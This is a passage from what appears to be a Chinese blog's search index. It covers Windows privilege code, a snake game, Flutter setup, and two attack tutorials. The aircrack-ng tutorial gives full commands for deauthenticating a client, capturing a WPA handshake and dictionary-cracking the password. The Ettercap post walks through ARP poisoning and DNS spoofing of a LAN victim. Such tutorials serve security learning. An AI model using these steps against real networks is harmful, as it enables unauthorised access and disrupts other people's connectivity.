&amp;bSaclPresent, &amp;pSacl, &amp;bSaclDefaulted) || !bSaclPresent) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// set pSecurityDescriptor to file</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">SetNamedSecurityInfo</span>(</span><br><span class=\"line\">        <span class=\"keyword\">const_cast</span>&lt;LPWSTR&gt;(wPath.<span class=\"built_in\">c_str</span>()),</span><br><span class=\"line\">        SE_FILE_OBJECT,</span><br><span class=\"line\">        flags,</span><br><span class=\"line\">        psidOwner,</span><br><span class=\"line\">        psidGroup,</span><br><span class=\"line\">        pDacl,</span><br><span class=\"line\">        pSacl) != ERROR_SUCCESS) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (pSecurityDescriptor) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">LocalFree</span>(pSecurityDescriptor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>以上代码虽然能编译成功，但是执行时会失败。首先执行上述代码需要管理员权限，其次，即使再管理员权限下运行，<code>SetNamedSecurityInfo</code>依然可能返回<code>ERROR_INVALID_OWNER</code>错误。可能ACE字符串解析出的Owner无效或不正确，可以用<code>IsValidSid</code>检测Owner是否合法。也可能当前进程没有分配<code>SeRestorePrivilege</code>特权。</p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>首先定义权限提升方法：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">bool</span> <span class=\"title\">EnablePrivilege</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">wchar_t</span>* privilegeName)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(TOKEN_PRIVILEGES) * <span class=\"number\">2</span>];</span><br><span class=\"line\">    TOKEN_PRIVILEGES&amp; tkp = *((TOKEN_PRIVILEGES*) buf);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">OpenProcessToken</span>(</span><br><span class=\"line\">            <span class=\"built_in\">GetCurrentProcess</span>(),</span><br><span class=\"line\">            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class=\"line\">            &amp;hToken)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* enable SeBackupPrivilege, SeRestorePrivilege */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">LookupPrivilegeValue</span>(</span><br><span class=\"line\">            <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">            privilegeName,</span><br><span class=\"line\">            &amp;tkp.Privileges[<span class=\"number\">0</span>].Luid)) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!::<span class=\"built_in\">LookupPrivilegeValue</span>(</span><br><span class=\"line\">            <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">            SE_RESTORE_NAME,</span><br><span class=\"line\">            &amp;tkp.Privileges[<span class=\"number\">1</span>].Luid)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tkp.PrivilegeCount = <span class=\"number\">2</span>;</span><br><span class=\"line\">    tkp.Privileges[<span class=\"number\">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    tkp.Privileges[<span class=\"number\">1</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\"></span><br><span class=\"line\">    ::<span class=\"built_in\">AdjustTokenPrivileges</span>(hToken, <span class=\"literal\">false</span>, &amp;tkp, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(tkp), <span class=\"literal\">nullptr</span>, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后在调用上文提到的API之前调用<code>EnablePrivilege(SE_RESTORE_NAME)</code>提升进程权限：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// To get SACL</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">EnablePrivilege</span>(SE_SECURE_NAME)) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; <span class=\"string\">&quot;Error enabling SeSecurePrivilege&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// Set ACL</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">EnablePrivilege</span>(SE_RESTORE_NAME)) &#123;</span><br><span class=\"line\">        std::cerr &lt;&lt; <span class=\"string\">&quot;Error enabling SeRestorePrivilege&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// invoke GetSecurityDescriptorW or SetSecurityDescriptorW here ...</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","tags":["Windows"]},{"title":"aircrack-ng破解WiFi密码","url":"/2018/11/25/aircrack-ng%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/","content":"<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><ul>\n<li>一个支持数据包嗅探和注入（Packet Sniffing/Injection）的的WiFi网卡</li>\n<li>aircrack-ng</li>\n</ul>\n<p>Kali上自带aircrack-ng，如果是其他Linux需要自行下载（如ArchLinux下：<code>sudo pacman -S aircrack-ng</code>）</p>\n<p>用<code>sudo airmon-ng</code>检测网卡是否支持监听模式（Monitor Mode）。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PHY     Interface       Driver          Chipset</span><br><span class=\"line\"></span><br><span class=\"line\">phy0    wlp2s0          iwlwifi        Intel Corporation Wireless 8265 / 8275 (rev 78)</span><br></pre></td></tr></table></figure></p>\n<p>可见我的无线网卡<code>wlp2s0</code>是支持监听的，如果该命令没有任何输出则表示没有可以支持监听模式的网卡。<br><span id=\"more\"></span></p>\n<h2 id=\"抓取握手包\"><a href=\"#抓取握手包\" class=\"headerlink\" title=\"抓取握手包\"></a>抓取握手包</h2><p>开启网卡的监听模式：<code>sudo airmon-ng start wlp2s0</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Found 2 processes that could cause trouble.</span><br><span class=\"line\">Kill them using &#x27;airmon-ng check kill&#x27; before putting</span><br><span class=\"line\">the card in monitor mode, they will interfere by changing channels</span><br><span class=\"line\">and sometimes putting the interface back in managed mode</span><br><span class=\"line\"></span><br><span class=\"line\">  PID Name</span><br><span class=\"line\">  420 NetworkManager</span><br><span class=\"line\">  433 wpa_supplicant</span><br><span class=\"line\"></span><br><span class=\"line\">PHY     Interface       Driver          Chipset</span><br><span class=\"line\"></span><br><span class=\"line\">phy0    wlp2s0          iwlwifi         Intel Corporation Wireless 8265 / 8275 (rev 78)</span><br><span class=\"line\"></span><br><span class=\"line\">                (mac80211 monitor mode vif enabled for [phy0]wlp2s0 on [phy0]wlp2s0mon)</span><br><span class=\"line\">                (mac80211 station mode vif disabled for [phy0]wlp2s0)</span><br></pre></td></tr></table></figure></p>\n<p>上述信息告知了一些可能影响破解的进程，最好杀掉，否则可能会在抓包时卡死或者导致抓不到握手包。</p>\n<p><code>ifconfig</code>查看当前的网卡，原先的<code>wlp2s0</code>现在已经变成了<code>wlp2s0mon</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 1252  bytes 104572 (102.1 KiB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 1252  bytes 104572 (102.1 KiB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">wlp2s0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        unspec D4-25-8B-DF-47-C9-3A-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class=\"line\">        RX packets 268  bytes 35064 (34.2 KiB)</span><br><span class=\"line\">        RX errors 0  dropped 268  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 0  bytes 0 (0.0 B)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></p>\n<p>开始搜索周围的网络<code>sudo airodump-ng wlp2s0mon</code>：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CH  6 ][ Elapsed: 48 s ][ 2018-11-25 14:42 ][ WPA handshake: E6:46:DA:CC:74:1E                                         </span><br><span class=\"line\">                                                                                                                                                            </span><br><span class=\"line\">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class=\"line\"></span><br><span class=\"line\">E6:46:DA:DC:DC:68  -58       20        1    0   6  180  WPA2 CCMP   PSK  Looper                                                                               </span><br><span class=\"line\">4E:0B:BE:02:02:CF  -54       24        0    0   1  130  WPA2 CCMP   PSK  DIRECT-CSDESKTOP-G8VIQD6mstL                                </span><br><span class=\"line\">BC:3D:85:E3:6A:2D  -54       32       20    0  11  130  WPA2 CCMP   PSK  Pyramid                                                                            </span><br><span class=\"line\">B0:EB:57:7E:56:CA  -56       36        0    0   1  135  OPN              Honor V10                   </span><br><span class=\"line\">E6:46:DA:DC:DC:68  -58       20        1    0   6  180  WPA2 CCMP   PSK  Looper                                                                               </span><br></pre></td></tr></table></figure></p>\n<p>使用该命令列出无线网卡扫描到的WiFi热点详细信息，包括信号强度，加密类型，信道等。这里我们记下要破解WiFi的BSSID和信道（CH/Channel），当搜索到我们想要破解的WiFi热点时可以<code>Ctrl</code>+<code>C</code>停止搜索。</p>\n<p>使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了WiFi密码的握手包，当有新用户连接WiFi时会发送握手包。当我要抓取上述第一个WiFi热点的包，命令如下：</p>\n<p><code>sudo airodump-ng -c 6 --bssid E6:46:DA:DC:DC:68 -w ~/caps wlp2s0mon</code></p>\n<p><code>-c</code>,<code>--bssid</code>,<code>-w</code>分别指定了信道，BSSID，握手包存储目录。显示如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CH  6 ][ Elapsed: 5 mins ][ 2018-11-25 15:00                                                                                                                                                                                                    </span><br><span class=\"line\">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                               E6:46:DA:DC:DC:68  -55   0       90     1382    9   6  180  WPA2 CCMP   PSK  Looper</span><br><span class=\"line\"></span><br><span class=\"line\">BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    E6:46:DA:DC:DC:68  5C:5F:67:1E:F3:48  -51    0e- 6e     2     2051</span><br></pre></td></tr></table></figure>\n<p>现在我们使用<code>aireplay-ng</code>命令给已连接的设备发送一个反认证包，使该设备强制断开连接，随后它会自动再次连接WiFi。不难看出，<code>airplay-ng</code>生效的前提是WiFi热点中必须至少已经接入一个设备。 </p>\n<p>由于刚刚打开的终端一直在执行抓包工作，所以我们重新打开一个终端，输入命令。</p>\n<p><code>sudo aireplay-ng -0 2 -a E6:46:DA:DC:DC:68 -c  5C:5F:67:1E:F3:48  wlp2s0mon</code></p>\n<p><code>-a</code>后接WiFi的BSSID，<code>-c</code>接被攻击的设备的BSSID。</p>\n<p>此时静待抓包窗口抓到握手包，捕获后会有提示，<code>Ctrl</code>+<code>C</code>命令停止抓包，同时结束无线网卡的监听模式:<br><code>sudo airmon-ng stop wlp2s0mon</code></p>\n<h2 id=\"字典暴力破解\"><a href=\"#字典暴力破解\" class=\"headerlink\" title=\"字典暴力破解\"></a>字典暴力破解</h2><p>最后将握手包中的密码和字典密码匹配：<br><code>sudo aircrack-ng -a2 -b E6:46:DA:DC:DC:68 -w ～/dic.txt ~/caps/*.cap</code></p>\n<p>此处的字典需要自行准备，字典是按行分割的纯文本文件，每行是一个密码。如果是Kali环境，可以使用自带的字典：<code>/usr/share/wordlist/rockyou.txt</code></p>\n<p>成功获取密码425670389：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[00:00:00] 1/0 keys tested (173.10 k/s) </span><br><span class=\"line\"></span><br><span class=\"line\">      Time left: </span><br><span class=\"line\"></span><br><span class=\"line\">                           KEY FOUND! [ 425670389 ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      Master Key     : 9E DC BD 2E 3C 46 3E A5 0D 43 60 BD 7D DD 86 10 </span><br><span class=\"line\">                       59 5C 11 30 77 92 07 D6 9D 26 AF CB 2C 09 AB 62 </span><br><span class=\"line\"></span><br><span class=\"line\">      Transient Key  : 68 80 65 67 78 1C 0F 40 F9 81 3B 07 47 C1 34 BC </span><br><span class=\"line\">                       49 09 61 18 D7 1F C2 55 3B F1 73 F9 FD 7B 18 FC </span><br><span class=\"line\">                       93 B0 63 C8 23 0C D0 EE 72 A8 8C 1F EF 54 72 01 </span><br><span class=\"line\">                       98 EB 1B 40 07 25 1B A5 86 CF E6 66 0F 33 35 FF </span><br><span class=\"line\"></span><br><span class=\"line\">      EAPOL HMAC     : 43 93 FF 24 90 07 07 F8 B5 58 D6 DA 2B 1E AF 32 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>最后为了保证网络正常使用，重启networkManager服务，<code>sudo systemctl restart NetworkManager</code></p>\n","tags":["网络安全"]},{"title":"libcurse库实现多人贪吃蛇小游戏","url":"/2018/10/21/curse%E5%BA%93%E5%AE%9E%E7%8E%B0%E5%A4%9A%E4%BA%BA%E8%B4%AA%E5%90%83%E8%9B%87%E5%B0%8F%E6%B8%B8%E6%88%8F/","content":"<blockquote>\n<p>本文介绍在linux下实现一个字符小游戏贪吃蛇的过程，游戏纯C++编写，服务器使用chrono定时器做帧同步，支持所有类unix系统的select函数做非阻塞IO,采用TCP socket通信，协议部分采用protobuf二进制流;客户端使用curses字符界面库。</p>\n</blockquote>\n<h2 id=\"服务器\"><a href=\"#服务器\" class=\"headerlink\" title=\"服务器\"></a>服务器</h2><p>服务器实现所有逻辑，服务器只接受客户端的操作（包括上下左右四个方向），服务器的几个主要类为server,snake,zone,time分别用于表示一个房间，蛇，战场，计时器。每一局游戏开始，会实例化一个server，监听一个端口，创建一个游戏房间等待玩家接入，这里使用阻塞IO<code>accept()</code>，需要等加入的玩家达到人数才开始游戏。</p>\n<p>就绪后，初始化战场，一个房间对应一局比赛，一个战场。zone类给n个接入的玩家随机分配初始位置。一个战场中包含n个snake信息，snake中存了蛇的长度，以链表结构存储蛇的节点便于头尾的增删。snake中保存蛇的移动方向，当每次用户改变蛇的方向时都会改变方向变量，即使接下来不输入也会继续运动。snake中封装了各种移动方法和判定方法，实现吃事物，死亡，复活等操作。</p>\n<span id=\"more\"></span>\n<h2 id=\"帧同步\"><a href=\"#帧同步\" class=\"headerlink\" title=\"帧同步\"></a>帧同步</h2><p>如果用户不输入，就会让游戏阻塞，如果有人网络延迟，则会影响到其他玩家，阅读了实时游戏延迟的解决方案发现了帧同步，即划分等长时隙（帧），在每一帧对只对有效用户输入做处理，不去理会缺失输入的用户，这样就只会卡到有网络延迟的人。</p>\n<p>预想一个房间内玩家数不会超过10个，文件描述符较少，则采用跨平台的非阻塞IO<code>select()</code>接收客户端的信息，更新对应snake的方向参数，等到帧末依据snake的方向，进行snake的下一次移动，并判定移动是否造成死亡或者增加长度，然后更新战场信息，广播：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(active) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!timer.<span class=\"built_in\">count_down</span>()) <span class=\"built_in\">fetch_data</span>();<span class=\"comment\">//接收数据</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">send_sync_data</span>();<span class=\"comment\">//处理，更新战场，广播</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>原先我使用<code>settimer()</code>和ALARM信号机制做纳秒精度的定时器，但发现<code>signal(ALARM,func)</code>方法要求函数必须是静态，这带来了很多问题，于是我打自己封装一个计时器来实现时隙划分。</p>\n<p>首先考虑到<code>clock()</code>函数，能精确到毫秒，但是使用后发现刷新频率和预期不符，且帧长不稳定，查阅资料发现<code>clock()</code>只是记录<strong>CPU的使用时间</strong>，<code>select()</code>中等待的时间不算做CPU时间，导致了玩家操作密集则游戏速度加快，没有输入则游戏速度缓慢的问题。之后又看到<code>time()</code>函数，能记录程序执行时间，但是只能精确到秒，这是远远不够的。</p>\n<p>查阅资料后发现C++中有<code>std::chrono</code>库，是<code>time()</code>函数的高精度版本，可以精确到纳秒级记录程序执行时间，对其做简单封装，配合while就实现了计时器：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;chrono&gt;</span></span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">timer</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> std::chrono::high_resolution_clock clock;</span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> std::chrono::microseconds res;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> duration;</span><br><span class=\"line\">    clock::time_point start,last;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">timer</span>(<span class=\"keyword\">int</span>);</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">count_down</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"协议部分\"><a href=\"#协议部分\" class=\"headerlink\" title=\"协议部分\"></a>协议部分</h2><p>逻辑部份全部放在服务器上，客户端几乎只是用curses库做渲染，所以协议中需要包含当前帧地图上所有蛇的节点信息，食物信息，等。</p>\n<p>协议有很多种，可以是类似HTTP的字符报文，也可以是二进制流。对象的传输格式可以是json或者xml，但是为了减小带宽压力，我们信息对象封装后序列化成二进制流传输，这里用到了google的protobuf，一个对象序列化工具。</p>\n<p>首先下载protobuf编译器和库，我的协议如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax=&quot;proto2&quot;; </span><br><span class=\"line\">package GameProto;</span><br><span class=\"line\"></span><br><span class=\"line\">message Point &#123; // cordinate</span><br><span class=\"line\">    required int32 x = 1;</span><br><span class=\"line\">    required int32 y = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">message Food &#123;</span><br><span class=\"line\">    required int32 x = 1;</span><br><span class=\"line\">    required int32 y = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">message Snake &#123;</span><br><span class=\"line\">    required int32 color = 1;</span><br><span class=\"line\">    repeated Point node = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">message BattleField &#123; </span><br><span class=\"line\">    repeated Snake snake = 1;</span><br><span class=\"line\">    repeated Food food = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">message ServerMessage &#123; // server send this</span><br><span class=\"line\">    enum ActionType &#123; </span><br><span class=\"line\">        SyncMap = 0;</span><br><span class=\"line\">        LossGame = 1;</span><br><span class=\"line\">        WinGame = 2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    required ActionType action = 1;</span><br><span class=\"line\">    optional BattleField battle_field = 2;</span><br><span class=\"line\">    optional string msg = 3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>定义了Point,Food,Snake,Battlefield,ServerMessage类型，<code>protoc game_message.proto --cpp_out=.</code>,生成了<code>game_message.pb.h</code>和<code>game_message.pb.cc</code>文件</p>\n<p>服务器端生成proto对象的代码：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">GameProto::ServerMessage <span class=\"title\">zone::server_msg_proto_data</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    GOOGLE_PROTOBUF_VERIFY_VERSION;</span><br><span class=\"line\">    GameProto::ServerMessage msg;</span><br><span class=\"line\">    msg.<span class=\"built_in\">set_action</span>(GameProto::ServerMessage_ActionType_SyncMap);</span><br><span class=\"line\">    string message = <span class=\"string\">&quot;Test Message&quot;</span>;</span><br><span class=\"line\">    msg.<span class=\"built_in\">set_msg</span>(message);</span><br><span class=\"line\">    GameProto::BattleField* battleField = msg.<span class=\"built_in\">mutable_battle_field</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;snakes.<span class=\"built_in\">size</span>();i++) &#123;</span><br><span class=\"line\">        GameProto::Snake* ts = battleField-&gt;<span class=\"built_in\">add_snake</span>();</span><br><span class=\"line\">        ts-&gt;<span class=\"built_in\">set_color</span>(i);</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> node = snakes[i]-&gt;head; node!= <span class=\"literal\">nullptr</span>;node = node-&gt;next) &#123;</span><br><span class=\"line\">            GameProto::Point* p= ts-&gt;<span class=\"built_in\">add_node</span>();</span><br><span class=\"line\">            p-&gt;<span class=\"built_in\">set_x</span>(node-&gt;x);</span><br><span class=\"line\">            p-&gt;<span class=\"built_in\">set_y</span>(node-&gt;y);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">auto</span> food:foods) &#123;</span><br><span class=\"line\">        GameProto::Food* tf = battleField-&gt;<span class=\"built_in\">add_food</span>();</span><br><span class=\"line\">        tf -&gt; <span class=\"built_in\">set_x</span>(food.x);</span><br><span class=\"line\">        tf -&gt; <span class=\"built_in\">set_y</span>(food.y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> msg;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>proto对象序列化成数组，发送:<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> GameProto::ServerMessage &amp;msg = battle_zone-&gt;<span class=\"built_in\">server_msg_proto_data</span>();</span><br><span class=\"line\"><span class=\"keyword\">void</span>* buf = <span class=\"built_in\">malloc</span>((<span class=\"keyword\">size_t</span>)msg.<span class=\"built_in\">ByteSize</span>());</span><br><span class=\"line\">msg.<span class=\"built_in\">SerializeToArray</span>(buf,msg.<span class=\"built_in\">ByteSize</span>());</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;client_num;i++) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">send</span>(client_socket[i], buf, msg.<span class=\"built_in\">ByteSize</span>(),<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h2><p>linux的shell下英文等款字体宽高比是1：2，导致每个节点上下和横向移动会缩放，为了解决这个突兀的问题，对client上的zone做了一点优化，重新封装了<code>mvaddchar()</code>方法，用左右两个字符，一对<code>()</code>来表示一个节点。</p>\n<p>客户端给网络通信单独开辟一个线程，一旦接受到服务器的数据就更新图像。指令则用while配合<code>getch()</code>读取键盘。</p>\n<p>运行截图：<br><img src=\"screenshot.png\" alt=\"\"></p>\n","tags":["Linux"]},{"title":"Ettercap实现dns污染","url":"/2018/11/09/ettercap%E5%AE%9E%E7%8E%B0dns%E6%B1%A1%E6%9F%93/","content":"<ul>\n<li>测试环境：ArchLinux</li>\n</ul>\n<p>ettercap是一个内网嗅探工具，Kali中自带，ArchLinux下可以用pacman安装：<code>sudo pacman -S ettercap</code>，也可以用安装图形界面版本：<code>sudo pacman -S ettercap-gtk</code>，笔者采用的是图形界面版本</p>\n<p><code>Alt</code>+空格，输入ettercap，输入密码即可。<br><img src=\"Screenshot_20181108_183218.png\" alt=\"\"></p>\n<p>先编辑<code>/etc/ettercap/etter.dns</code>配置文件，这里填写DNS污染规则<br><img src=\"Screenshot_20181108_184529.png\" alt=\"\"><br>比如这里的两行就是让所有<code>ipgw.neu.edu.cn</code>指向127.0.0.1（会导致别人上不了网）</p>\n<span id=\"more\"></span>\n<p>点击Sniff，选择网卡。点击Host-&gt;Scan for host,扫描局域网中的Host。完成后点击Host-&gt;Host list就能查看当前接入的Host。控制台输入<code>netstat -rn</code>：<br><img src=\"Screenshot_20181108_183622.png\" alt=\"\"></p>\n<p>Destination为0.0.0.0的就是网关地址(172.20.10.1)，Host list中找到网关，点击Add to Target1，选择要被攻击的Host，添加到Target2。然后点击Mitm-&gt;ARP poisoning开始毒化。点击Plugin-&gt;Manange the plugin，点选dns_spoof<br><img src=\"Screenshot_20181108_184027.png\" alt=\"\"></p>\n<p>最后点击Start-&gt;Start sniffing开始攻击。被攻击者的所有http的dns都会被解析到目标域名。</p>\n","tags":["网络安全","内网渗透"]},{"title":"Flutter学习笔记","url":"/2019/11/26/flutter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<p>flutter是google的移动UI框架，可以在ios和andriod上快速构建App，使用Dart语言。官网<code>https://flutter.dev/</code></p>\n<p>flutter和RN(React Native)生成的是原生的应用，而不是类似Cordova的H5页面（最大40fps）。RN对于复杂的view要多次叠加渲染，最大60fps。flutter使用了自己的GDI和硬件加速，最大达到120fps，甚至被用于开发游戏。但目前RN的生态依旧是第一。flutter优秀组件：<a href=\"https://github.com/Solido/awesome-flutter\">awesome-flutter</a></p>\n<span id=\"more\"></span>\n<blockquote>\n<p>Flutter官方文档：<a href=\"https://docs.flutter.dev/get-started/install/linux\">flutter doc</a>，中文社区的文档还停留在18年，不要用！</p>\n</blockquote>\n<h2 id=\"开发环境搭建：\"><a href=\"#开发环境搭建：\" class=\"headerlink\" title=\"开发环境搭建：\"></a>开发环境搭建：</h2><p>Linux环境详见：<a href=\"https://docs.flutter.dev/get-started/install/linux\">Linux Install</a></p>\n<p>墙国需要添加环境变量，详见<a href=\"https://github.com/flutter/flutter/wiki/Using-Flutter-in-China\">Using-Flutter-in-China</a>。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># flutter source for China</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> PUB_HOSTED_URL=https://pub.flutter-io.cn</span><br><span class=\"line\"><span class=\"built_in\">export</span> FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn</span><br></pre></td></tr></table></figure>\n<p>从flutter官网<a href=\"https://flutter.io/sdk-archive/#macos\">下载flutter</a>并解压到<code>~/flutter</code>，设置<code>PATH</code>环境变量：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> PATH=<span class=\"variable\">$PATH</span>:<span class=\"variable\">$HOME</span>/flutter/bin</span><br></pre></td></tr></table></figure><br>最后用<code>flutter doctor</code>检查是否缺少依赖。</p>\n<h2 id=\"AVD\"><a href=\"#AVD\" class=\"headerlink\" title=\"AVD\"></a>AVD</h2><p>MIUI 开发者选项 USB 